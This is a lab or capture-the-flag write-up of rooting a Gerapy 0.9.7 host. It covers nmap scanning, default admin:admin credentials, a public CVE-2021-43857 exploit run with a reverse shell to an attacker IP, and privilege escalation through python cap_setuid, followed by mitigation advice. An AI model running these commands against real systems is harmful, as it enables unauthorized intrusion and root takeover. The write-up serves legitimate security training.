## Introduction

I identified that ports 22 and 8000 were open. Navigating to port 8000 revealed a login portal for the Gerapy web application. By using default credentials, I successfully gained access to the interface. Noticing that the application was running version 0.9.7 (as indicated at the bottom of the page), I searched for and utilized a publicly available exploit targeting this version to achieve remote access. Further enumeration revealed that the `python` binary had the `cap_setuid` capabilities enabled, which I exploited to escalate privileges and gain root access.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open 
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

We usually skip SSH.

## Web

### Port 8000

- Version - WSGIServer 0.2 (Python 3.10.6)

## Exploitation

We are presented with login panel I used `admin:admin` and got in. I saw the version information at the bottom and the found public exploit for it:

![image.png](image%201.png)

[ExploitDB CVE-2021-43857](https://www.exploit-db.com/exploits/50640)

Exploit works by logging in to application, then getting the list of created projects `(it will fail if there's none)`, then use the project setting to run the vulnerable spider mechanism by sending reverse shell payload.

[https://github.com/LongWayHomie/CVE-2021-43857/blob/main/README.md](https://github.com/LongWayHomie/CVE-2021-43857/blob/main/README.md)

So I created a random project, and then executed the exploit and a shell:

![image.png](image%202.png)

```bash
python3 50640.py -t 192.168.242.24 -p 8000 -L 192.168.45.155 -P 8000
```

I checked SUID binaries and tried `sudo -l`

I transferred `db.sqlite3` with python over attack machine:

[SQLite Pentesting](https://exploit-notes.hdks.org/exploit/database/sqlite-pentesting/)

> SQLite is a lightweight, self-contained, serverless relational database management system (RDBMS). Unlike traditional databases like MySQL or PostgreSQL, SQLite does not require a separate server process—the entire database is stored in a single file on disk.
Key Features:
- Embedded: It's part of the application; no separate server or configuration is needed.
- Zero-configuration: No setup or administration required.
- Portable: The database is just a file you can copy or move easily.
- ACID-compliant: Supports transactions to ensure data integrity.
{: .prompt-info }

But I didn’t find anything interesting in the database:

Enumerating Capabilities:

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

we see:

I found a very interesting one.

[Python-Capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)

```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")’
```

Now we are root!

## Mitigation

- **Service Hardening:**
    - Disable or restrict access to non-essential ports (such as 8000) using firewall rules.
    - Avoid running web applications on development ports in production environments.
- **Authentication Security:**
    - Remove or change all default credentials immediately after installation.
    - Enforce strong password policies and implement two-factor authentication where possible.
- **Software Updates:**
    - Regularly update applications like Gerapy to the latest stable versions to patch known vulnerabilities.
    - Monitor vulnerability databases for any CVEs affecting software in use.
- **Capabilities Management:**
    - Audit binary capabilities using `getcap -r / 2>/dev/null` and remove unnecessary capabilities using `setcap -r`.
    - Avoid assigning `cap_setuid` or `cap_setgid` to scripting languages like Python unless absolutely necessary.
- **Privilege Escalation Protection:**
    - Apply the principle of least privilege across all user roles and services.
    - Use security modules like AppArmor or SELinux to limit what binaries can do, even if compromised.
